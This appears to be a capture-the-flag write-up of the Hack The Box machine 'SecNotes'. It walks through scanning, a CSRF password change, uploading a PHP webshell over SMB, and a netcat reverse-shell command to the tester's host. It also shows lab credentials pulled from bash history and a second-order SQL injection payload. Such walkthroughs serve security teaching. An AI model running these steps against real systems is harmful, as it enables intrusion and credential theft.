## Default Information
IP Address: 10.10.10.97\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.97    secnotes.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.97 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-02-12 16:49:57 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8808/tcp on 10.10.10.97                                   
Discovered open port 445/tcp on 10.10.10.97                                    
Discovered open port 80/tcp on 10.10.10.97 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | Microsoft IIS httpd | Open |
| 445	| micrsoft-ds | Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB) | Open |
| 8808	| http | Microsoft IIS httpd | Open |

### Web Enumeration on Port 80
We will then use Gobuster to find the endpoints that are accessible from http://secnotes.htb. From the output, we can see that most of the endpoints gets redirected to /login.php. However, there is one other endpoints that raises my attention to, which is /register.php

```
http://10.10.10.97:80/Contact.php          (Status: 302) [Size: 0] [--> login.php]
http://10.10.10.97:80/Home.php             (Status: 302) [Size: 0] [--> login.php]
http://10.10.10.97:80/DB.php               (Status: 500) [Size: 1208]
http://10.10.10.97:80/Login.php            (Status: 200) [Size: 1223]
http://10.10.10.97:80/auth.php             (Status: 500) [Size: 1208]
http://10.10.10.97:80/contact.php          (Status: 302) [Size: 0] [--> login.php]
http://10.10.10.97:80/db.php               (Status: 500) [Size: 1208]
http://10.10.10.97:80/home.php             (Status: 302) [Size: 0] [--> login.php]
http://10.10.10.97:80/logout.php           (Status: 302) [Size: 0] [--> login.php]
http://10.10.10.97:80/login.php            (Status: 200) [Size: 1223]
http://10.10.10.97:80/register.php         (Status: 200) [Size: 1569]
```

whatweb was also able to detect that the HTTP server string is Microsoft-IIS/10.0 and the X-Powered-By header is PHP/7.2.7

```
[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	String       : Microsoft-IIS/10.0 (from server string)

[ X-Powered-By ]
	X-Powered-By HTTP header

	String       : PHP/7.2.7 (from x-powered-by string)
```

### Null Authentication on smbclient
Next, let us try to do null authentication on smbclient. Unfortunately, we are unable to do a null authentication on smbclient.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.10.97 -P 445
[!] Authentication error on 10.10.10.97
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.10.97
[!] Authentication error on 10.10.10.97
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p null -H 10.10.10.97
[!] Authentication error on 10.10.10.97
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p "" -H 10.10.10.97
[!] Authentication error on 10.10.10.97
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p null -H 10.10.10.97
[!] Authentication error on 10.10.10.97
```

### Web Enumeration on port 8080

Gobuster was unable to discover any meaningful endpoints on port 8080, but whatweb is able to pick up that port 8080 is running on Microsoft IIS from the server string

```
Detected Plugins:
[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	String       : Microsoft-IIS/10.0 (from server string)
```

## Exploit
### Obtaining Tyler's credentials
Navigating to http://secnotes.htb/register.php, we are able to register a user and login to the page. We will then be redirected to home.php endpoint that shows us the following screen.
![home.php](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secnotes/home_php.png)

Next, we realize that if we use http://10.10.16.5:3000 as the input in the contact.php endpoint, we will receive a callback on our server. This potentially means that we can execute requests to the endpoints with tyler@secnotes.htb. This would mean that we can execute requests to change_pass.php as tyler@secnotes.htb

![contact.php](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secnotes/contact_php.png)

Looking at the requests for change_pass.php, we are able to reconstruct the POST request for change_pass.php to become a GET request to the endpoint for change_pass.php?password=test1234&confirmr_password=test123&submit=submit.

We will then use the endpoint as an input on contact.php page to change the password for tyler@secnotes.htb. This will then modify tyler's password to become ```test123```

![Changing tyler's password](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secnotes/change_tyler_password.png)

Looking at all the notes, we were able to find the credentials for Tyler

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

### SMB Access as tyler
Now, we will try to use smbmap on the user tyler. From the output, we realize that there a ```new-site``` share where we have READ and WRITE permissions.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97
[+] IP: 10.10.10.97:445 Name: secnotes.htb                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
```

Next, we will connect to the ```new-site``` share and list all the files in the share.

```
┌──(kali㉿kali)-[~]
└─$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site                                             1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Feb 12 19:50:56 2022
  ..                                  D        0  Sat Feb 12 19:50:56 2022
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

                7736063 blocks of size 4096. 3388706 blocks available
```

However, we are unable to find iistart.png file on port 80. Moving to port 8088, we are able to find iistart.png file at http://secnotes.htb:8088/iistart.png. This means that the file contents on the SMB server are reflected to port 8088.

Next, let us try if we are able to put a file onto the SMB server and access it.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
Try "help" to get a list of possible commands.
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
```

![smb upload file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secnotes/smb_put.png)

Next, we will proceed to put a webshell onto the smb server and using the curl command, we are able to execute commands on port 8808. However, we realize that the SMB server will delete the webshell regularly so we only have a short window of time to exploit.

```
┌──(kali㉿kali)-[~/Desktop/secnotes]
└─$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
Try "help" to get a list of possible commands.
smb: \> put cmd.php
putting file cmd.php as \cmd.php (0.2 kb/s) (average 0.2 kb/s)

┌──(kali㉿kali)-[~/Desktop/secnotes]
└─$ curl http://secnotes.htb:8808/cmd.php?cmd=whoami                                                 
secnotes\tyler
```

Lastly, all we have to do is to upload the nc.exe onto the SMB server and execute a curl command to obtain a reverse shell.

```
smb: \> put nc.exe
putting file nc.exe as \nc.exe (24.4 kb/s) (average 6.5 kb/s)

┌──(kali㉿kali)-[~]
└─$ curl http://secnotes.htb:8808/cmd.php?cmd=nc.exe+-e+cmd.exe+10.10.16.5+4000
```

### Obtaining user flag
```
C:\Users\tyler\Desktop>type user.txt
type user.txt
<Redacted user text>
```

### Obtaining admin credentials
Viewing the directory of C:\Users\tyler\Desktop, we are able to find a bash.lnk file and viewing the contents of the bash.lnk file, we are able to find a C:\Windows\System32\bash.exe file location string. Unfortunately, we are unable to find the bash.exe with the path location.

```
C:\Users\tyler>cd C:\System32\bash.exe
cd C:\System32\bash.exe
The system cannot find the path specified.
```

Next, we will try to locate bash.exe executable and we are able to find the location for bash.exe

```
C:\Users\tyler>where /R c:\ bash.exe
where /R c:\ bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

Next, we will execute bash.exe executable using the file path that we have found previously, and we will have to use python3 to obtain an interactive shell.

```
C:\Users\tyler\Desktop>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@SECNOTES:~# 
```

Afterwhich, we notice that the .bash_history file is not empty and contains the smbclient command which uses the adminstrator's credentials to mount to the c$ drive.

```
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
```

Using the same command, we are able to use the adminstrator credentials to mount the C drive as well.

```
┌──(kali㉿kali)-[~/Desktop/secnotes]
└─$ smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$                                        1 ⨯
Try "help" to get a list of possible commands.
smb: \> 
```

Afterwards, we will download the root flag to our local machine.

```
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

### Obtaining root flag
```
┌──(kali㉿kali)-[~/Desktop/secnotes]
└─$ cat root.txt                                     
<Redacted root flag>
```

## Post-Exploitation
### Privilege Escalation via File System
Looking at the contents of C:\, we realize that there is a ubuntu.zip file, this hints that Ubuntu LTS is present on this machine. 

```
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\

06/21/2018  02:07 PM    <DIR>          Distros
06/21/2018  05:47 PM    <DIR>          inetpub
06/22/2018  01:09 PM    <DIR>          Microsoft
04/11/2018  03:38 PM    <DIR>          PerfLogs
06/21/2018  07:15 AM    <DIR>          php7
01/26/2021  02:39 AM    <DIR>          Program Files
01/26/2021  02:38 AM    <DIR>          Program Files (x86)
06/21/2018  02:07 PM       201,749,452 Ubuntu.zip
06/21/2018  02:00 PM    <DIR>          Users
01/26/2021  02:38 AM    <DIR>          Windows
               1 File(s)    201,749,452 bytes
               9 Dir(s)  13,882,724,352 bytes free
```

Checking the directory of appdata for Ubuntu LTS, we realize that we are able to gain access to the root directory and view the files, where we are able to obtain the ```.bash_history``` files.

```
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>dir        
dir                                                         
 Volume in drive C has no label.                                                     
 Volume Serial Number is 1E7B-9B76                                                  
 Directory of C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root           
06/22/2018  01:44 PM    <DIR>          .                                                           
06/22/2018  01:44 PM    <DIR>          ..                                                           
06/22/2018  02:09 AM             3,112 .bashrc                                                      
02/12/2022  06:02 PM               484 .bash_history                                                
06/21/2018  05:00 PM               148 .profile                                                     
06/22/2018  01:56 AM    <DIR>          filesystem                                                  
               3 File(s)          3,744 bytes
               3 Dir(s)  13,882,445,824 bytes free

```

Viewing the .bash_history file here will also reveal to use the smbclient command.

### Second-order SQLI
Another method to obtain the notes for tyler is to use second-order SQLI when registering for a user. By registering a user as ```' or 1='1```, we will be able to obtain all the notes for all the users on the site.
![Second order SQLI injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secnotes/second_order_sqli.png)
